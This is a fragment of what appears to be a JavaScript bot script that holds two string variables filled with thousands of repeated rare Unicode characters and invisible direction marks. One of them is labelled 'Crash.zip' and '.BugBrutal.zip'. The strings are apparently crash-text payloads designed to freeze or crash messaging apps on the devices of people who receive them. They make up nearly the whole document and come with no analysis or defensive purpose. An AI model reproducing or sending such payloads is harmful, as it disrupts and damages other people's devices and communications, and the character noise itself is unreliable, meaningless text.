࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬`
  
  let kroco = `📄Crash.zip                                                             📄.BugBrutal.zip                                                                  
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏